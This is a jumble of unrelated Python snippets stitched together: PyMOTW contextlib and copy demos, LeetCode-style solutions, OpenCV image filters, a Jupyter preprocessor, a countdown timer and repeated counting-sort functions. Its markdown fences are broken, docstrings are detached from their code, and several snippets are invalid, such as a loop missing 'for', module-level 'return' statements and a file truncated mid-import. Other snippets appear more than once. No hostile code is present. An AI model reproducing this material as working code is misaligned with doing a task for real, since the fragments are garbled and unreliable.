
    def __exit__(self, exc_type, exc_val, exc_tb):
        print("__exit__()")
        print("  exc_type =", exc_type)
        print("  exc_val  =", exc_val)
        print("  exc_tb   =", exc_tb)
        return self.handle_error


with Context(True):
    raise RuntimeError("error message handled")

print()

with Context(False):
    raise RuntimeError("error message propagated")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyImplementing the context manager API by hand.```


```py

# end_pymotw_header
class WithinContext:
    def __init__(self, context):
        print("WithinContext.__init__({})".format(context))

    def do_something(self):
        print("WithinContext.do_something()")

    def __del__(self):
        print("WithinContext.__del__")


class Context:
    def __init__(self):
        print("Context.__init__()")

    def __enter__(self):
        print("Context.__enter__()")
        return WithinContext(self)

    def __exit__(self, exc_type, exc_val, exc_tb):
        print("Context.__exit__()")


with Context() as c:
    c.do_something()

```









---


```py

# end_pymotw_header
import contextlib


class Door:
    def __init__(self):
        print("  __init__()")
        self.status = "open"

    def close(self):
        print("  close()")
        self.status = "closed"


print("Normal Example:")
with contextlib.closing(Door()) as door:
    print("  inside with statement: {}".format(door.status))
print("  outside with statement: {}".format(door.status))

print("\nError handling example:")
try:
    with contextlib.closing(Door()) as door:
        print("  raising from inside with statement")
        raise RuntimeError("error message")
except Exception as err:
    print("  Had an error:", err)

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py

# end_pymotw_header
import contextlib


class Tracker:
    "Base class for noisy context managers."

    def __init__(self, i):
        self.i = i

    def msg(self, s):
        print("  {}({}): {}".format(self.__class__.__name__, self.i, s))

    def __enter__(self):
        self.msg("entering")


class HandleError(Tracker):
    "If an exception is received, treat it as handled."

    def __exit__(self, *exc_details):
        received_exc = exc_details[1] is not None
        if received_exc:
            self.msg("handling exception {!r}".format(exc_details[1]))
        self.msg("exiting {}".format(received_exc))
        # Return Boolean value indicating whether the exception
        # was handled.
        return received_exc


class PassError(Tracker):
    "If an exception is received, propagate it."

    def __exit__(self, *exc_details):
        received_exc = exc_details[1] is not None
        if received_exc:
            self.msg("passing exception {!r}".format(exc_details[1]))
        self.msg("exiting")
        # Return False, indicating any exception was not handled.
        return False


class ErrorOnExit(Tracker):
    "Cause an exception."

    def __exit__(self, *exc_details):
        self.msg("throwing error")
        raise RuntimeError("from {}".format(self.i))


class ErrorOnEnter(Tracker):
    "Cause an exception."

    def __enter__(self):
        self.msg("throwing error on enter")
        raise RuntimeError("from {}".format(self.i))

    def __exit__(self, *exc_info):
        self.msg("exiting")

```









---


```py

# end_pymotw_header
import contextlib


@contextlib.contextmanager
def make_context():
    print("  entering")
    try:
        yield {}
    except RuntimeError as err:
        print("  ERROR:", err)
    finally:
        print("  exiting")


print("Normal:")
with make_context() as value:
    print("  inside with statement:", value)

print("\nHandled error:")
with make_context() as value:
    raise RuntimeError("showing example of handling an error")

print("\nUnhandled error:")
with make_context() as value:
    raise ValueError("this exception is not handled")

```









---


```py

# end_pymotw_header
import contextlib


@contextlib.contextmanager
def make_context():
    print("  entering")
    try:
        # Yield control, but not a value, because any value
        # yielded is not available when the context manager
        # is used as a decorator.
        yield
    except RuntimeError as err:
        print("  ERROR:", err)
    finally:
        print("  exiting")


@make_context()
def normal():
    print("  inside with statement")


@make_context()
def throw_error(err):
    raise err


print("Normal:")
normal()

print("\nHandled error:")
throw_error(RuntimeError("showing example of handling an error"))

print("\nUnhandled error:")
throw_error(ValueError("this exception is not handled"))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyImplementing the context manager API by hand.```


```py
# end_pymotw_header
import contextlib


class Context(contextlib.ContextDecorator):
    def __init__(self, how_used):
        self.how_used = how_used
        print("__init__({})".format(how_used))

    def __enter__(self):
        print("__enter__({})".format(self.how_used))
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        print("__exit__({})".format(self.how_used))


@Context("as decorator")
def func(message):
    print(message)


print()
with Context("as context manager"):
    print("Doing work in the context")

print()
func("Doing work in the wrapped function")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py


# end_pymotw_header
import contextlib


def callback(*args, **kwds):
    print("closing callback({}, {})".format(args, kwds))


with contextlib.ExitStack() as stack:
    stack.callback(callback, "arg1", "arg2")
    stack.callback(callback, arg3="val3")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py


# end_pymotw_header
import contextlib


with contextlib.ExitStack() as stack:

    @stack.callback
    def inline_cleanup():
        print("inline_cleanup()")
        print("local_resource = {!r}".format(local_resource))

    local_resource = "resource created in context"
    print("within the context")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py


# end_pymotw_header
import contextlib


def callback(*args, **kwds):
    print("closing callback({}, {})".format(args, kwds))


try:
    with contextlib.ExitStack() as stack:
        stack.callback(callback, "arg1", "arg2")
        stack.callback(callback, arg3="val3")
        raise RuntimeError("thrown error")
except RuntimeError as err:
    print("ERROR: {}".format(err))

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py


# end_pymotw_header
import contextlib


@contextlib.contextmanager
def make_context(i):
    print("{} entering".format(i))
    yield {}
    print("{} exiting".format(i))


def variable_stack(n, msg):
    with contextlib.ExitStack() as stack:
        for i in range(n):
            stack.enter_context(make_context(i))
        print(msg)


variable_stack(2, "inside context")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py

# end_pymotw_header
import contextlib

from contextlib_context_managers import *


def variable_stack(contexts):
    with contextlib.ExitStack() as stack:
        for c in contexts:
            stack.enter_context(c)
    print("  outside of stack, any errors were handled")


print("No errors:")
variable_stack([HandleError(1), PassError(2)])

print("\nError at the end of the context stack:")
variable_stack([HandleError(1), HandleError(2), ErrorOnExit(3)])

print("\nError in the middle of the context stack:")
variable_stack([HandleError(1), PassError(2), ErrorOnExit(3), HandleError(4)])

try:
    print("\nError ignored:")
    variable_stack([PassError(1), ErrorOnExit(2)])
except RuntimeError:
    print("error handled outside of context")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.```









---


```py

# end_pymotw_header
import contextlib

from contextlib_context_managers import *


def variable_stack(contexts):
    with contextlib.ExitStack() as stack:
        for c in contexts:
            stack.enter_context(c)
        # Return the close() method of a new stack as a clean-up
        # function.
        return stack.pop_all().close
    # Explicitly return None, indicating that the ExitStack could
    # not be initialized cleanly but that cleanup has already
    # occurred.
    return None


print("No errors:")
cleaner = variable_stack([HandleError(1), HandleError(2)])
cleaner()

print("\nHandled error building context manager stack:")
try:
    cleaner = variable_stack([HandleError(1), ErrorOnEnter(2)])
except RuntimeError as err:
    print("caught error {}".format(err))
else:
    if cleaner is not None:
        cleaner()
    else:
        print("no cleaner returned")

print("\nUnhandled error building context manager stack:")
try:
    cleaner = variable_stack([PassError(1), ErrorOnEnter(2)])
except RuntimeError as err:
    print("caught error {}".format(err))
else:
    if cleaner is not None:
        cleaner()
    else:
        print("no cleaner returned")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFiles as context managers.```


```py

# end_pymotw_header
with open("/tmp/pymotw.txt", "wt") as f:
    f.write("contents go here")
# file is automatically closed

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import contextlib


class NonFatalError(Exception):
    pass


def non_idempotent_operation():
    raise NonFatalError("The operation failed because of existing state")


try:
    print("trying non-idempotent operation")
    non_idempotent_operation()
    print("succeeded!")
except NonFatalError:
    pass

print("done")

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
from contextlib import redirect_stdout, redirect_stderr
import io
import sys


def misbehaving_function(a):
    sys.stdout.write("(stdout) A: {!r}\n".format(a))
    sys.stderr.write("(stderr) A: {!r}\n".format(a))


capture = io.StringIO()
with redirect_stdout(capture), redirect_stderr(capture):
    misbehaving_function(5)

print(capture.getvalue())

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import contextlib


class NonFatalError(Exception):
    pass


def non_idempotent_operation():
    raise NonFatalError("The operation failed because of existing state")


with contextlib.suppress(NonFatalError):
    print("trying non-idempotent operation")
    non_idempotent_operation()
    print("succeeded!")

print("done")

# Source : https://leetcode.com/problems/continuous-subarray-sum/?tab=Description
# Author : Han Zichi
# Date   : 2017-03-01


class Solution(object):
    def checkSubarraySum(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: bool
        """
        sum, pre, s = 0, 0, set()

        for item in nums:
            sum += item
            if k:
                sum %= k

            if sum in s:
                return True

            s.add(pre)
            pre = sum

        return False

from threading import Thread
import zmq

if zmq.pyzmq_version_info() >= (17, 0):
    from tornado.ioloop import IOLoop
else:
    # deprecated since pyzmq 17
    from zmq.eventloop.ioloop import IOLoop


class ControlThread(Thread):
    def __init__(self, **kwargs):
        Thread.__init__(self, **kwargs)
        self.io_loop = IOLoop(make_current=False)
        self.pydev_do_not_trace = True
        self.is_pydev_daemon_thread = True

    def run(self):
        self.io_loop.make_current()
        try:
            self.io_loop.start()
        finally:
            self.io_loop.close()

    def stop(self):
        """Stop the thread.

        This method is threadsafe.
        """
        self.io_loop.add_callback(self.io_loop.stop)

L, = eval(dir()[0])
s = 0


while len(L) > 1:
    L = (
        numpy.add(L[:-1:2], L[1::2])
        if s % 2 == 0
        else numpy.multiply(L[:-1:2], L[1::2])
    )
    s += 1

return L[0]
````

```pysolution to the convert array problem"""


def f(arr):
    """sorts the array by numbers in place using constant extra space"""

    position = 0
    for i in xrange(len(arr) / 3):
        gap = (len(arr) - position) / 3
        arr.insert(position + 1, arr.pop(position + gap * 1))
        arr.insert(position + 2, arr.pop(position + gap * 2))
        position += 3

    return arr

# Source : https://leetcode.com/problems/convert-bst-to-greater-tree/#/description
# Author : Han Zichi
# Date   : 2017-04-23

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def convertBST(self, root):
        """
        :type root: TreeNode
        :rtype: TreeNode
        """

        def dfs(node):
            if node == None:
                return
            else:
                dfs(node.right)
                node.val += dfs.total
                dfs.total = node.val
                dfs(node.left)

        dfs.total = 0
        dfs(root)
        return root
```

````py
    Implemented an algorithm using opencv to convert a colored image into its negative```


```py
from cv2 import destroyAllWindows, imread, imshow, waitKey


def convert_to_negative(img):
    # getting number of pixels in the image
    pixel_h, pixel_v = img.shape[0], img.shape[1]

    # converting each pixel's color to its negative
    for i in range(pixel_h):
        for j in range(pixel_v):
            img[i][j] = [255, 255, 255] - img[i][j]

    return img


if __name__ == "__main__":
    # read original image
    img = imread("image_data/lena.jpg", 1)

    # convert to its negative
    neg = convert_to_negative(img)

    # show result image
    imshow("negative of original image", img)
    waitKey(0)
    destroyAllWindows()
````

````pyModule containing a preprocessor that converts outputs in the notebook from
one format to another.```


```py

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.


from .base import Preprocessor
from traitlets import Unicode


class ConvertFiguresPreprocessor(Preprocessor):
    """
    Converts all of the outputs in a notebook from one format to another.
    """

    from_format = Unicode(help="Format the converter accepts").tag(config=True)
    to_format = Unicode(help="Format the converter writes").tag(config=True)

    def __init__(self, **kw):
        """
        Public constructor
        """
        super().__init__(**kw)

    def convert_figure(self, data_format, data):
        raise NotImplementedError()

    def preprocess_cell(self, cell, resources, cell_index):
        """
        Apply a transformation on each cell,

        See base.py
        """

        # Loop through all of the datatypes of the outputs in the cell.
        for output in cell.get("outputs", []):
            if (
                output.output_type in {"execute_result", "display_data"}
                and self.from_format in output.data
                and self.to_format not in output.data
            ):

                output.data[self.to_format] = self.convert_figure(
                    self.from_format, output.data[self.from_format]
                )

        return cell, resources

# @Author  : lightXu
# @File    : convolve.py
# @Time    : 2019/7/8 0008 下午 16:13
from cv2 import COLOR_BGR2GRAY, cvtColor, imread, imshow, waitKey
from numpy import array, dot, pad, ravel, uint8, zeros


def im2col(image, block_size):
    rows, cols = image.shape
    dst_height = cols - block_size[1] + 1
    dst_width = rows - block_size[0] + 1
    image_array = zeros((dst_height * dst_width, block_size[1] * block_size[0]))
    row = 0
    for i in range(0, dst_height):
        for j in range(0, dst_width):
            window = ravel(image[i : i + block_size[0], j : j + block_size[1]])
            image_array[row, :] = window
            row += 1

    return image_array


def img_convolve(image, filter_kernel):
    height, width = image.shape[0], image.shape[1]
    k_size = filter_kernel.shape[0]
    pad_size = k_size // 2
    # Pads image with the edge values of array.
    image_tmp = pad(image, pad_size, mode="edge")

    # im2col, turn the k_size*k_size pixels into a row and np.vstack all rows
    image_array = im2col(image_tmp, (k_size, k_size))

    #  turn the kernel into shape(k*k, 1)
    kernel_array = ravel(filter_kernel)
    # reshape and get the dst image
    dst = dot(image_array, kernel_array).reshape(height, width)
    return dst


if __name__ == "__main__":
    # read original image
    img = imread(r"../image_data/lena.jpg")
    # turn image in gray scale value
    gray = cvtColor(img, COLOR_BGR2GRAY)
    # Laplace operator
    Laplace_kernel = array([[0, 1, 0], [1, -4, 1], [0, 1, 0]])
    out = img_convolve(gray, Laplace_kernel).astype(uint8)
    imshow("Laplacian", out)
    waitKey(0)

# Copyright 2007 Doug Hellmann.
#```


```pyDeep copy example
````

````py

# end_pymotw_header
import copy
import functools


@functools.total_ordering
class MyClass:
    def __init__(self, name):
        self.name = name

    def __eq__(self, other):
        return self.name == other.name

    def __gt__(self, other):
        return self.name > other.name


a = MyClass("a")
my_list = [a]
dup = copy.deepcopy(my_list)

print("             my_list:", my_list)
print("                 dup:", dup)
print("      dup is my_list:", (dup is my_list))
print("      dup == my_list:", (dup == my_list))
print("dup[0] is my_list[0]:", (dup[0] is my_list[0]))
print("dup[0] == my_list[0]:", (dup[0] == my_list[0]))

# Copyright 2007 Doug Hellmann.
#```


```pyShallow copy example
````

````py

# end_pymotw_header
import copy
import functools


@functools.total_ordering
class MyClass:
    def __init__(self, name):
        self.name = name

    def __eq__(self, other):
        return self.name == other.name

    def __gt__(self, other):
        return self.name > other.name

    def __copy__(self):
        print("__copy__()")
        return MyClass(self.name)

    def __deepcopy__(self, memo):
        print("__deepcopy__({})".format(memo))
        return MyClass(copy.deepcopy(self.name, memo))


a = MyClass("a")

sc = copy.copy(a)
dc = copy.deepcopy(a)

# -*- coding: utf-8 -*-```


```pyCopy of dictionaries.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1jsQqJ4FivnaU1qJTKyufBaGsqMRR9LY1

# Dictionaries

- key and value pairs
- key is what we call any hashable object
- hash()```


```py

# take in a string
# turn the string in to a meaningful determanistic number

# take in a string
# create a sum variable
# iterate over the string
# turn each char in to a number
# increment sum by that number
# return sum


def my_hash(key):
    sum = 0
    c in key:
        nc = ord(c)
        print(c)
        print(nc)


my_hash("A")
````

````py
Add "Herb" to the phonebook with the number 7653420789.
Remove "Bill" from the phonebook.```


```py
phonebook = {
    "Abe": 4569874321,
    "Bill": 7659803241,
    "Barry": 6573214789
}

# YOUR CODE HERE


# Should print Herb is in the phonebook.
if "Herb" in phonebook:
    print("Herb is in the phonebook.")

# Should print Bill is not in the phonebook.
if "Bill" not in phonebook:
    print("Bill is not in the phonebook.")
````

```py# Demos"""

```

````py
Given an array of integers `nums` and an integer `target`, return the indices
of the two numbers that add up to the `target`.
Examples:
- two_sum(nums = [2,5,9,13], target = 7) -> [0,1] (nums[0] + nums[1] == 7)
- two_sum(nums = [4,3,5], target = 8) -> [1,2] (nums[1] + nums[2] == 8)
Notes:
- Each input will have only one solution.
- You may not use the same element twice.
- You can return the answer in any order.```


```py




# Copyright 2007 Doug Hellmann.
#```


```pyShallow copy example
````

````py

# end_pymotw_header
import copy


class Graph:
    def __init__(self, name, connections):
        self.name = name
        self.connections = connections

    def add_connection(self, other):
        self.connections.append(other)

    def __repr__(self):
        return "Graph(name={}, id={})".format(self.name, id(self))

    def __deepcopy__(self, memo):
        print("\nCalling __deepcopy__ for {!r}".format(self))
        if self in memo:
            existing = memo.get(self)
            print("  Already copied to {!r}".format(existing))
            return existing
        print("  Memo dictionary:")
        if memo:
            for k, v in memo.items():
                print("    {}: {}".format(k, v))
        else:
            print("    (empty)")
        dup = Graph(copy.deepcopy(self.name, memo), [])
        print("  Copying to new object {}".format(dup))
        memo[self] = dup
        for c in self.connections:
            dup.add_connection(copy.deepcopy(c, memo))
        return dup


root = Graph("root", [])
a = Graph("a", [root])
b = Graph("b", [a, root])
root.add_connection(a)
root.add_connection(b)

dup = copy.deepcopy(root)

# Copyright 2007 Doug Hellmann.
#```


```pyShallow copy example
````

```py

# end_pymotw_header
import copy
import functools


@functools.total_ordering
class MyClass:
    def __init__(self, name):
        self.name = name

    def __eq__(self, other):
        return self.name == other.name

    def __gt__(self, other):
        return self.name > other.name


a = MyClass("a")
my_list = [a]
dup = copy.copy(my_list)

print("             my_list:", my_list)
print("                 dup:", dup)
print("      dup is my_list:", (dup is my_list))
print("      dup == my_list:", (dup == my_list))
print("dup[0] is my_list[0]:", (dup[0] is my_list[0]))
print("dup[0] == my_list[0]:", (dup[0] == my_list[0]))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def consumer():
    r = ""
    while True:
        n = yield r
        if not n:
            return
        print("[CONSUMER] Consuming %s..." % n)
        r = "200 OK"


def produce(c):
    c.send(None)
    n = 0
    while n < 5:
        n = n + 1
        print("[PRODUCER] Producing %s..." % n)
        r = c.send(n)
        print("[PRODUCER] Consumer return: %s" % r)
    c.close()


c = consumer()
produce(c)

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Simple algorithm to count
# number of occurrences of (n) in (ar)

# Sudo: Algorithm
#  each time (n) is found in (ar)
#  (count) varible in incremented (by 1)

# I've put spaces to separate different
# stages of algorithms for easy understanding
# however isn't a good practise


def count(ar, n):
    count = 0

    for element in ar:
        # More complex condition could be
        # => (not element != n)
        if element == n:
            count += 1

    return count


# Testing
# add your test cases in list below
test_cases = [([1, 1, 2, 3, 5, 8, 13, 21, 1], 1), ("Captain America", "a")]
for test_case in test_cases:
    print("TestCase: {}, {}".format(test_case[0], test_case[1]))
    print("Results: {}\n".format(count(test_case[0], test_case[1])))

# You can add condition to check weather output is correct
# or not

# def countSumOfTwoRepresentations3(n, l, r):
#     if r < n // 2 or l > n // 2:
#         return 0
#     return n // 2 - max(l, n-r) + 1
# 87

# countSumOfTwoRepresentations3 = lambda n, l, r: max(n // 2 - max(l, n-r) + 1, 0)
# 66

n, l, r = eval(dir()[0])
return max(n // 2 - max(l, n - r) + 1, 0)
# 50

from datetime import datetime


# Don't confuse this is "Main" algorithm
# Time calculated is near accurate because of some extra instructions
# before actually executing the algorithm
def count_cpu_microtime(func_name, *args):
    tmp = [i for i in args]
    t1 = datetime.now().microsecond
    func_name(*tmp)
    time_took = datetime.now().microsecond - t1
    return round(time_took, 5)


# Testing

# "Test" algorithm
def binary_search(array, n):
    arr = sorted(array)
    to_return = False
    first_elem = 0
    last_elem = len(arr) - 1
    while first_elem <= last_elem:
        mid = (first_elem + last_elem) // 2
        if arr[mid] == n:
            to_return = True
            break
        else:
            if n > arr[mid]:
                first_elem = mid + 1
            else:
                last_elem = mid - 1
    return to_return


result = count_cpu_microtime(binary_search, [12, 324, 23, 213, 3, 2, 1], 1)
print(str(result) + " microsecs")
```

````py
Give a string s, count the number of non-empty (contiguous) substrings that have
 the same number of 0's and 1's, and all the 0's and all the 1's in these substrings are grouped consecutively.

Substrings that occur multiple times are counted the number of times they occur.
Example 1:
Input: "00110011"
Output: 6
Explanation: There are 6 substrings that have equal number of consecutive 1's and 0's: "0011", "01", "1100", "10", "0011", and "01".

Notice that some of these substrings repeat and are counted the number of times they occur.

Also, "00110011" is not a valid substring because all the 0's (and 1's) are not grouped together.

Example 2:
Input: "10101"
Output: 4
Explanation: There are 4 substrings: "10", "01", "10", "01" that have equal number of consecutive 1's and 0's.
Reference: https://leetcode.com/problems/count-binary-substrings/description/```


```py


def count_binary_substring(s):
    cur = 1
    pre = 0
    count = 0
    for i in range(1, len(s)):
        if s[i] != s[i - 1]:
            count = count + min(pre, cur)
            pre = cur
            cur = 1
        else:
            cur = cur + 1
    count = count + min(pre, cur)
    return count
````

````py
Count Consecutive Sums

Positive integers can be expressed as sums of consecutive positive integers in various ways.

Input: 42
Output: 4
Output explanation: (a) 3 + 4 + 5 + 6 + 7 + 8 + 9, (b) 9 + 10 + 11 + 12, (c) 13 + 14 + 15 and (d) 42

=========================================
Iterate all N elements and add each to the sum, but store the start element and if the current sum is
bigger than N substract the front elements.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def count_consecutive_sums(n):
    start = 1
    curr_sum = count = 0

    for end in range(1, n + 1):
        curr_sum += end

        while curr_sum > n:
            # remove all numbers from the front
            curr_sum -= start
            start += 1

        if curr_sum == n:
            count += 1

    return count


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(count_consecutive_sums(42))

# Test 2
# Correct result => 6
print(count_consecutive_sums(99))

# Test 3
# Correct result => 2
print(count_consecutive_sums(92))

# An island in matrix is a group of linked areas, all having the same value.
# This code counts number of islands in a given matrix, with including diagonal
# connections.


class matrix:  # Public class to implement a graph
    def __init__(self, row: int, col: int, graph: list):
        self.ROW = row
        self.COL = col
        self.graph = graph

    def is_safe(self, i, j, visited) -> bool:
        return (
            0 <= i < self.ROW
            and 0 <= j < self.COL
            and not visited[i][j]
            and self.graph[i][j]
        )

    def diffs(self, i, j, visited):  # Checking all 8 elements surrounding nth element
        rowNbr = [-1, -1, -1, 0, 0, 1, 1, 1]  # Coordinate order
        colNbr = [-1, 0, 1, -1, 1, -1, 0, 1]
        visited[i][j] = True  # Make those cells visited
        for k in range(8):
            if self.is_safe(i + rowNbr[k], j + colNbr[k], visited):
                self.diffs(i + rowNbr[k], j + colNbr[k], visited)

    def count_islands(self) -> int:  # And finally, count all islands.
        visited = [[False for j in range(self.COL)] for i in range(self.ROW)]
        count = 0
        for i in range(self.ROW):
            for j in range(self.COL):
                if visited[i][j] is False and self.graph[i][j] == 1:
                    self.diffs(i, j, visited)
                    count += 1
        return count

def get_set_bits_count(number: int) -> int:
    """
    Count the number of set bits in a 32 bit integer
    >>> get_set_bits_count(25)
    3
    >>> get_set_bits_count(37)
    3
    >>> get_set_bits_count(21)
    3
    >>> get_set_bits_count(58)
    4
    >>> get_set_bits_count(0)
    0
    >>> get_set_bits_count(256)
    1
    >>> get_set_bits_count(-1)
    Traceback (most recent call last):
        ...
    ValueError: the value of input must be positive
    """
    if number < 0:
        raise ValueError("the value of input must be positive")
    result = 0
    while number:
        if number % 2 == 1:
            result += 1
        number = number >> 1
    return result


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Count Positives

Given several numbers, count how many different results bigger or equal than 0 can you produce by only
using addition (+) and substraction (-). All the numbers must be used.

Input: [2, 3, 1]
Output: 4
Output explanation:
        2+3+1 = 6
        2+3-1 = 4
        2-3+1 = 0
        2-3-1 = -2 (negative)
        -2+3+1 = 2
        -2+3-1 = 0 (double)
        -2-3+1 = -4 (negative)
        -2-3-1 = - 6 (negative)

=========================================
Use hashset and make all combinations.
    Time Complexity:    O(2^N)  , I'm not sure how to compute the real complexity, but it's TOO MUCH faster than 2^N
    Space Complexity:   O(2^N)```


```py


############
# Solution #
############


def count_positives(numbers):
    results = set()
    results.add(0)

    # make all combinations
    for num in numbers:
        temp = set()  # use a temporary hashset for the newest results
        for res in results:
            temp.add(res + num)
            temp.add(res - num)
        results = temp  # replace the results

    # count unique positives
    count = 0
    for res in results:
        if res >= 0:
            count += 1

    return count


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(count_positives([2, 3, 1]))
````

````py
Your function should take in a single parameter (a string `word`)
Your function should return a count of how many occurences of ***"th"*** occur within `word`. Case matters.
Your function must utilize recursion. It cannot contain any loops.```


```py


def count_th(word):
    if len(word) < 2:
        return 0

    if word[:2] == "th":
        return 1 + count_th(word[2:])
    else:
        return count_th(word[1:])


print(count_th("worhit"))

# import modules like 'os' and 'time'
import os
import time

os.system("clear")

# using ctime() to show present time
times = time.ctime()
print("\nCurrent Time: ", times)

print("\n     Welcome to CountdownTimer!\n\n     Let's set up the countdown timer...\n")

# User input for the timer
hours = int(input("     How many hours? "))
minutes = int(input("     How many minutes? "))
seconds = int(input("     How many seconds? "))

# To display message when the given value is not a number
if hours or minutes or seconds == "":
    print("\n Invalid entry. You must enter a number.")

# Conversion of hours amd minutes into seconds
hrsToSec = (hours * 60) * 60
mnsToSec = minutes * 60
seconds = seconds

seconds = hrsToSec + mnsToSec + seconds
print("\n Timer has been set for " + str(seconds) + " seconds.")

# Loop for displaying the timer

for i in range(seconds, -1, -1):
    displayHours = int(seconds / 3600)
    displayMinutes = int(seconds / 60)
    if displayMinutes >= 60:
        displayMinutes = displayMinutes - (displayHours * 60)
    else:
        displayMinutes = displayMinutes
    displaySeconds = int(seconds % 60)
    print(
        "\n     Your time remaining is: {}:{}:{}".format(
            str(displayHours).zfill(2),
            str(displayMinutes).zfill(2),
            str(displaySeconds).zfill(2),
        )
    )
    seconds -= 1
    time.sleep(1)  # delays in the excution of a program for 1 second

print("\n Time is over.")

# -*- coding: utf-8 -*-

# Copyright (c) 2012 Giorgos Verigakis <verigak@gmail.com>
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

from __future__ import unicode_literals
from . import Infinite, Progress


class Counter(Infinite):
    def update(self):
        self.write(str(self.index))


class Countdown(Progress):
    def update(self):
        self.write(str(self.remaining))


class Stack(Progress):
    phases = (" ", "▁", "▂", "▃", "▄", "▅", "▆", "▇", "█")

    def update(self):
        nphases = len(self.phases)
        i = min(nphases - 1, int(self.progress * nphases))
        self.write(self.phases[i])


class Pie(Stack):
    phases = ("○", "◔", "◑", "◕", "●")
````

````py
problem:

Given an integer array arr, count element x such that x + 1 is also in arr.
If there're duplicates in arr, count them separately.

Ex:
Input: arr = [1,2,3]
Output: 2
Explanation: 1 and 2 are counted cause 2 and 3 are in arr.```


```py


def countElements(arr):
    # use a set to store all unique elements in the array
    in_arr = set(arr)
    ans = 0
    # loop through all elements in the array because duplicated are counted separately
    for n in arr:
        # if the number + 1 in the set (checking an element in a set takes O(1) time)
        if n + 1 in in_arr:
            ans += 1
    return ans


print(countElements([1, 1, 2]))
````

````py
Author: OMKAR PATHAK
Created On: 31st July 2017

 - Best = Average = Worst =  O(n + k)```


```py
import inspect


# counting sort algorithm
def sort(_list):
    """
    counting sort algorithm

    :param _list: list of values to sort
    :return: sorted values
    """
    try:
        max_value = 0
        for i in range(len(_list)):
            if _list[i] > max_value:
                max_value = _list[i]

        buckets = [0] * (max_value + 1)

        for i in _list:
            buckets[i] += 1
        i = 0

        for j in range(max_value + 1):
            for a in range(buckets[j]):
                _list[i] = j
                i += 1

        return _list

    except TypeError as error:
        print("Counting Sort can only be applied to integers. {}".format(error))


# TODO: Are these necessary?
def time_complexities():
    """
    Return information on functions
    time complexity
    :return: string
    """
    return "Best Case: O(n + k), Average Case: O(n + k), Worst Case: O(n + k)"


def get_code():
    """
    easily retrieve the source code
    of the sort function

    :return: source code
    """
    return inspect.getsource(sort)
````

````py
ID: 0088a99a-fcfb-40de-87ed-d26b98449d3d
Python Algorithms, Page 79```


```py
from collections import defaultdict
from collections.abc import Callable, Iterable

from src.typehints import T


def counting_sort_dict(
    items: Iterable[T], key: Callable[[T], int] = lambda x: x
) -> Iterable[T]:
    groups = defaultdict(list)
    for item in items:
        groups[key(item)].append(item)
    for k in range(min(groups), max(groups) + 1):
        yield from groups[k]
````

````py
ID: 0088a99a-fcfb-40de-87ed-d26b98449d3d
Python Algorithms, Page 79```


```py
from collections import defaultdict
from collections.abc import Callable, Iterable

from src.typehints import T


def counting_sort_dict(
    items: Iterable[T], key: Callable[[T], int] = lambda x: x
) -> Iterable[T]:
    groups = defaultdict(list)
    for item in items:
        groups[key(item)].append(item)
    for k in range(min(groups), max(groups) + 1):
        yield from groups[k]
````

````py
ID: 0088a99a-fcfb-40de-87ed-d26b98449d3d
Python Algorithms, Page 79```


```py
from collections import defaultdict
from collections.abc import Callable, Iterable

from src.typehints import T


def counting_sort_dict(
    items: Iterable[T], key: Callable[[T], int] = lambda x: x
) -> Iterable[T]:
    groups = defaultdict(list)
    for item in items:
        groups[key(item)].append(item)
    for k in range(min(groups), max(groups) + 1):
        yield from groups[k]
````

````py
ID: 29227b58-d1f9-4575-bdf7-13dea23d77fb
https://en.wikipedia.org/wiki/Counting_sort```


```py
from collections.abc import Callable, Sequence
from itertools import accumulate

from src.typehints import T


def counting_sort_list(items: Sequence[T], key: Callable[[T], int] = lambda x: x):
    max_value = max(map(key, items))
    count = [0] * (max_value + 1)
    for item in items:
        count[key(item)] += 1
    count = list(accumulate(count, initial=0))
    ret = [None] * len(items)
    for item in items:
        i = count[key(item)]
        ret[i] = item
        count[key(item)] = i + 1
    return ret
````

````py
ID: 29227b58-d1f9-4575-bdf7-13dea23d77fb
https://en.wikipedia.org/wiki/Counting_sort```


```py
from collections.abc import Callable, Sequence
from itertools import accumulate

from src.typehints import T


